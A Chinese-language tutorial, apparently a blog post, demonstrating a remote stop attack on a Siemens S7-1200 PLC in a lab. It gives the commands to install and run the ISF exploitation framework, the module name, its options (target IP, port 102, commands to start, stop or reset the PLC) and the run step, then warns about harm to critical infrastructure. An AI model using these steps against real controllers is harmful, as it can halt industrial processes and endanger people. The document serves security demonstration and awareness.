针对工控PLC攻防案例  

  

  

德国西门子（SIEMENS）公司生产的可编程序控制器在我国的应用相当广泛，在冶金、化工、印刷生产线等领域都有应用。西门子（SIEMENS）公司的PLC产品包括S7-200、S7-1200、S7-300、S7-400、S7-1500等。西门子S7系列PLC体积小、速度快、标准化，具有网络通信能力，功能更强，可靠性高。S7系列PLC产品可分为微型PLC（如S7-200），小规模性能要求的PLC（如S7-300）和中、高性能要求的PLC（如S7-400）。

针对西门子S7协议或罗克韦尔AB Ethernet/IP、施耐德Modbus等工控协议，攻击者通过对主流工控协议的深度分析，向PLC设备发送远程停机、程序上传下载等控制指令数据报文，实现对下位机PLC的非法控制。

  
  
  

  

**接下来给大家进行西门子S7-1200启停的漏洞复现。**

  
![](../Images/0ff79e29f9d80a0b485a0179d8317202.png)

**工具及运行环境**

root@kali:~# git clone https://github.com/dark-lbp/isf/  

root@kali:~# cd isf/

root@kali:~/isf# python isf.py        

root@kali:~/isf# pip install -r requirements.txt

  

注：蓝色的这两个指令，可以直接启动plc利用程序。

安装好所需python模块，运行isf.py无报错

  
![](../Images/d54e26ed3c0d89496e49b608f150c4a9.png)![](../Images/febabd95aec15c3d662e1e9e4dd5bb28.png)  
![](../Images/beb00c01e83a6a8eca2632cd29313943.png)

**网络设置与PLC连接**

  

  

本次实验所用的PLC设备如下，设备型号为SIMATIC S7-1200

  

![](../Images/0f40971dea1959e21898ba6d4b4bb22b.png)

  

  

将设备接通电源后，此时PLC 指示灯 RUN/STOP 点亮 绿灯  

![](../Images/464611d5042b8e0527b360c9679140f3.png)

  

  

此时我们还不知道PLC设定的IP地址，所以需要对网段进行扫描,再使用网线将PLC与主机相连,配置主机网卡IP地址.

![](../Images/3549d979c12735d07e4bc421b08d3ac1.png)

可以看到：使用nmap扫描出的设备除了本机IP就是PLC设备的IP了，其对应的MAC地址也与设备上的标识一致

  

远程攻击演示

这里我们用到的攻击模块是

  

use exploits/plcs/siemens/s7\_1200\_plc\_control

  

![](../Images/87ab409d2cfb695126882962416d8528.png)

  

show options查看该模块的配置信息

target: 攻击PLC目标IP地址

port: 攻击PLC目标端口（默认是102端口）

command：攻击指令（0-启动PLC、1-停止PLC、2-重置PLC、3-重置PLC和IP）

  

![](../Images/ec459619188b9c71a23d1c27697e5b5c.png)

  

设置好后，输入run指令 开始远程攻击PLC

  

![](../Images/aeb84be52602ee4f67675da95f243e37.png)

  

  

此时PLC指示灯 RUN/STOP 变成黄灯，说明PLC设备已经停止运行，远程攻击成功！不法分子可以利用此类工控漏洞进行大范围破坏，设想如果此台PLC操纵的是石油、化工、电网、水利、电梯、轨道地铁等关键基础设施设备，后果将不堪设想。

  

![](../Images/c932c2e30aef8e1127049751cd1809a9.png)
